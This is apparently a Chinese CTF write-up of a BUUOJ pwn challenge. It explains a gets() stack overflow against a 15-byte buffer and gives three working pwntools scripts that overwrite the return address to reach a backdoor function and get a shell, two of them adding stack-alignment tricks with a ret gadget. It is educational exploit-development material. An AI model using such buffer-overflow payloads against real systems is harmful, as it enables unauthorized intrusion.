这题搞了很久，收获了许多

![](https://raw.githubusercontent.com/Whitebird0/tuchuang/main/QQ%E6%88%AA%E5%9B%BE20211108231355.png)

ida打开看了一下，是gets造成的栈溢出，双击s

![](https://raw.githubusercontent.com/Whitebird0/tuchuang/main/QQ%E6%88%AA%E5%9B%BE20211108231416.png)

s的大小为15，超过15就会溢出

这题两个思路

1.就是用15个字符覆盖s，然后直接就是后门函数，因为64位没有通过栈传参，而是寄存器传参，所以直接后面接后面函数地址，就可以getshell了，不过这种远程可以打通，本地打不通


              from pwn import *
              io=remote("node4.buuoj.cn",29378)
              payload=b'A'*15+p64(0x401186)
              io.sendline(payload)
              io.interactive()

2.通过传统的方法，先15个字符覆盖s,然后覆盖RBP,最后填后面函数地址，但是有问题，这里的问题是栈对齐造成的，我们一种是手动栈对齐，另外一种通过ret栈对齐

手动栈对齐

              from pwn import *
              io=remote("node4.buuoj.cn",29378)
              payload=b'A'*15+b'A'*8+p64(0x401186+1)
              io.sendline(payload)
              io.interactive()

通过ret栈对齐
            
              from pwn import *
              io=remote("node4.buuoj.cn",29378)
              payload=b'A'*15+b'A'*8+p64(0x401198)+p64(0x401186)
              io.sendline(payload)
              io.interactive()

这里的401198地址是ret,所以平栈后又把401186pop到EIP里，调用后门函数
